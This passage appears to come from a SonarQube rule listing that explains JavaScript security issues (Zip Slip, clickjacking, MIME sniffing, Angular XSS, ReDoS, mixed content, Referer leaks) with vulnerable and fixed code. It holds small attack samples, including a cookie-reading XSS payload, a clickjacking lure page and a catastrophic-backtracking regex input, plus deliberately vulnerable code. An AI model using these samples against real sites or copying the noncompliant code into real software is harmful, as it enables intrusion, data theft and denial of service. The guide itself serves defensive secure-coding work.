<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
const { spawn } &#61; require(&#34;child_process&#34;);
const input &#61; req.query.input;
if (allowed.includes(input)) {
  const proc &#61; spawn(&#34;/usr/bin/find&#34;, [input]);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6096">
              jssecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries&#39; names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const AdmZip &#61; require(&#34;adm-zip&#34;);
const upload &#61; require(&#39;multer&#39;);

app.get(&#39;/example&#39;, upload.single(&#39;file&#39;), (req, res) &#61;&gt; {
    const zip &#61; new AdmZip(req.file.buffer);
    const zipEntries &#61; zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        var writer &#61; fs.createWriteStream(zipEntry.entryName); // Noncompliant
        writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
    });
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const AdmZip &#61; require(&#34;adm-zip&#34;);
const upload &#61; require(&#39;multer&#39;);

const unzipTargetDir &#61; &#34;/example/directory/&#34;;

app.get(&#39;/example&#39;, upload.single(&#39;file&#39;), (req, res) &#61;&gt; {
    const zip &#61; new AdmZip(req.file.buffer);
    const zipEntries &#61; zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        const canonicalPath &#61; path.normalize(unzipTargetDir &#43; zipEntry.entryName);
        if (canonicalPath.startsWith(unzipTargetDir)) {
            let writer &#61; fs.createWriteStream(canonicalPath);
            writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
        }
    });
});
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol><li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative
  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li></ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end
with a path separator:</p>
<pre>
const AdmZip &#61; require(&#34;adm-zip&#34;);

const targetDirectory &#61; &#34;/Users/John&#34;;

app.get(&#39;/example&#39;, (req, res) &#61;&gt; {
    const canonicalPath &#61; path.normalize(targetDirectory &#43; req.query.filename)

    if (canonicalPath.startsWith(targetDirectory)) {
        const zip &#61; new AdmZip(canonicalPath);
	    const zipEntries &#61; zip.getEntries();

    	zipEntries.forEach(function (zipEntry) {
            var writer &#61; fs.createWriteStream(zipEntry.entryName);
            writer.write(zipEntry.getData().toString(&#34;utf8&#34;));
	    });
    }
});
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/advisories/GHSA-xwg4-93c6-3h42" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://snyk.io/research/zip-slip-vulnerability" rel="nofollow">snyk</a> - Zip Slip Vulnerability </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5732">
              javascript:S5732
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/Clickjacking" rel="nofollow">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain
buttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>
<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to
change the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed
on the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below
embedded code added on a malicious website:</p>
<pre>
&lt;html&gt;
&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;
&lt;br&gt;
&lt;iframe src&#61;&#34;https://socialnetworkexample.com/makemyprofilpublic&#34; width&#61;&#34;200&#34; height&#61;&#34;200&#34;&gt;&lt;/iframe&gt;
&lt;/html&gt;
</pre>
<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the
<em>makemyprofilpublic</em> page.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> <a href="https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories" rel="nofollow">Critical actions</a> of the application are prone to clickjacking
  attacks because a simple click on a link or a button can trigger them. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of
frame allowed to be loaded by the browser (this directive deprecates <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" rel="nofollow">X-Frame-Options</a>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if
<code>frameAncestors</code> is set to <code>&#39;none&#39;</code>):</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: [&#34;&#39;none&#39;&#34;] // Sensitive: frameAncestors  is set to none
    }
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: [&#34;&#39;example.com&#39;&#34;] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheets</a> - Clickjacking Defense
  Cheat Sheet </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors" rel="nofollow">developer.mozilla.org</a> -
  Frame-ancestors </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li><li> <a href="https://cwe.mitre.org/data/definitions/451" rel="nofollow">MITRE, CWE-451</a> - User Interface (UI) Misrepresentation of Critical Information </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5734">
              javascript:S5734
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/" rel="nofollow">MIME confusion</a> attacks occur when an
attacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource
(script, image, stylesheet …​) web browsers look for the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" rel="nofollow">Content-Type
header</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid
content-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content
of the resources (the first bytes). This &#34;guess mechanism&#34; is called <a href="https://en.wikipedia.org/wiki/Content_sniffing" rel="nofollow">MIME type
sniffing</a>.</p>
<p>Attackers can take advantage of this feature when a website (&#34;example.com&#34; here) allows to upload arbitrary files. In that case, an attacker can
upload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a href="https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots" rel="nofollow">a polyglot content</a> file) such as:</p>
<pre>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</pre>
<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers
performing MIME type sniffing.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" rel="nofollow">Content-Type</a> header is not systematically set for all
  resources. </li><li> Content of resources can be controlled by users. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" rel="nofollow">X-Content-Type-Options</a> header with
<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing
MIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object
context, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if, when using <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a>, the <code>noSniff</code>
middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet({
    noSniff: false, // Sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by
default):</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet&#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(helmet.noSniff());
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" rel="nofollow">developer.mozilla.org</a> - X-Content-Type-Options
  </li><li> <a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/" rel="nofollow">blog.mozilla.org</a> - Mitigating MIME
  Confusion Attacks in Firefox </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6268">
              javascript:S6268
            </a>
          </td>
          <td>
            <details>
              <p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework
before they are inserted into the DOM.</p>
<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting
malicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive
information or impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The value for which sanitization has been disabled is user-controlled. </li><li> It’s difficult to understand how this value is constructed. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to
  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li><li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li><li> Make sure to choose the correct <a href="https://angular.io/api/platform-browser/DomSanitizer" rel="nofollow">DomSanitizer</a> &#34;bypass&#34; method based on the
  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
import { Component, OnInit } from &#39;&#64;angular/core&#39;;
import { DomSanitizer, SafeHtml } from &#34;&#64;angular/platform-browser&#34;;
import { ActivatedRoute } from &#39;&#64;angular/router&#39;;

&#64;Component({
  template: &#39;&lt;div id&#61;&#34;hello&#34; [innerHTML]&#61;&#34;hello&#34;&gt;&lt;/div&gt;&#39;
})
export class HelloComponent implements OnInit {
  hello: SafeHtml;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    let name &#61; this.route.snapshot.queryParams.name;
    let html &#61; &#34;&lt;h1&gt;Hello &#34; &#43; name &#43; &#34;&lt;/h1&gt;&#34;;
    this.hello &#61; this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import { Component, OnInit } from &#39;&#64;angular/core&#39;;
import { DomSanitizer } from &#34;&#64;angular/platform-browser&#34;;
import { ActivatedRoute } from &#39;&#64;angular/router&#39;;

&#64;Component({
  template: &#39;&lt;div id&#61;&#34;hello&#34;&gt;&lt;h1&gt;Hello {<!-- -->{name}}&lt;/h1&gt;&lt;/div&gt;&#39;,
})
export class HelloComponent implements OnInit {
  name: string;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    this.name &#61; this.route.snapshot.queryParams.name;
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li><li> <a href="https://angular.io/guide/security" rel="nofollow">Angular - Best Practices - Security</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5852">
              javascript:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in
some cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the
regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic
backtracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a
large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The input is user-controlled. </li><li> The input size is not restricted to a small number of characters. </li><li> There is no timeout in place to limit the regex evaluation time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen.</p>
<ul><li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of
  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains
  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).
  </li><li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a
  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of
  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and
  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>&#39;_&#39;</code> and can’t match that <code>&#39;_&#39;</code>. However,
  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li><li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the
  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can
  cause quadratic runtime on some inputs. For example <code>str.split(/\s*,/)</code> will run in quadratic time on strings that consist entirely of
  spaces (or at least contain large sequences of spaces, not followed by a comma). </li></ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul><li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>&#43;</code>
  for instance. </li><li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested
  quantifier situation <code>(ba&#43;)&#43;</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one
  <code>b</code> char per repetition of the group. </li><li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li><li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li></ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not
anchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul><li> Solve the problem without regular expressions </li><li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2" rel="nofollow">RE2</a> or <a href="https://github.com/uhop/node-re2/" rel="nofollow">node-re2</a>. </li><li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split(/\s*,\s*/)</code> with <code>str.split(&#34;,&#34;)</code> and
  then trimming the spaces from the strings as a second step. </li><li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course
  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were
  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and
  then the call to <code>str.match(regex)</code> could be replaced with <code>matched &#61; str.match(regex)</code> and <code>matched[1] !&#61;&#61;
  undefined</code>. </li></ul>
<h2>Sensitive Code Example</h2>
<p>The regex evaluation will never end:</p>
<pre>
/(a&#43;)&#43;$/.test(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;
); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not
supported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>
<pre>
/((?&#61;(a&#43;))\2)&#43;$/.test(
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;&#43;
&#34;aaaaaaaaaaaaaaa!&#34;
); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li><li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li><li> <a href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016" rel="nofollow">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li><li> <a href="https://www.regular-expressions.info/catastrophic.html" rel="nofollow">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers" rel="nofollow">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5730">
              javascript:S5730
            </a>
          </td>
          <td>
            <details>
              <p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not
encrypted and exposed to <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" rel="nofollow">MITM attacks</a> and could break the entire level of
protection that was desired by implementing encryption with the HTTPs protocol.</p>
<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>
<ul><li> A passive mixed-content (eg: <em>&lt;img src&#61;&#34;http://example.com/picture.png&#34;&gt;</em>) allows an attacker to access and replace only these
  resources, like images, with malicious ones that could lead to successful phishing attacks. </li><li> With active mixed-content (eg: <em>&lt;script src&#61;&#34;http://example.com/library.js&#34;&gt;</em>) an attacker can compromise the entire website by
  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of
mixed-contents.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      &#34;default-src&#34;: [&#34;&#39;self&#39;&#34;, &#39;example.com&#39;, &#39;code.jquery.com&#39;]
    } // Sensitive: blockAllMixedContent directive is missing
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to block mixed-content is to put in place the <a href="https://www.npmjs.com/package/helmet-csp" rel="nofollow">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> middleware with the
<code>blockAllMixedContent</code> directive:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      &#34;default-src&#34;: [&#34;&#39;self&#39;&#34;, &#39;example.com&#39;, &#39;code.jquery.com&#39;],
      blockAllMixedContent: [] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> -
  Sensitive Data Exposure </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">developer.mozilla.org</a> - Mixed-content </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5736">
              javascript:S5736
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/HTTP_referer" rel="nofollow">HTTP header referer</a> contains a URL set by web browsers and used by applications to track
from where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns" rel="nofollow">serious privacy and security problems</a>
if the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a href="https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/" rel="nofollow">removes path
information</a> in the Referer header while browsing privately.</p>
<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>
<pre>
&lt;html&gt;
&lt;body&gt;
&lt;form action&#61;&#34;/valid_order&#34; method&#61;&#34;GET&#34;&gt;
Type your credit card number to purchase products:
&lt;input type&#61;text id&#61;&#34;cc&#34; value&#61;&#34;1111-2222-3333-4444&#34;&gt;
&lt;input type&#61;submit&gt;
&lt;/form&gt;
&lt;/body&gt;
</pre>
<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be
https://example.com/valid_order?cc&#61;1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>
<ul><li> URLs are stored in the history of browsers. </li><li> URLs could be accidentally shared when doing copy/paste actions. </li><li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li></ul>
<p>In addition to these threats, when further requests will be performed from the &#34;valid_order&#34; page with a simple legitimate embedded script like
that:</p>
<pre>
&lt;script src&#61;&#34;https://webanalyticservices_example.com/track&#34;&gt;
</pre>
<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>
<pre>
GET /track HTTP/2.0
Host: webanalyticservices_example.com
Referer: https://example.com/valid_order?cc&#61;1111-2222-3333-4444
</pre>
<h2>Ask Yourself Whether</h2>
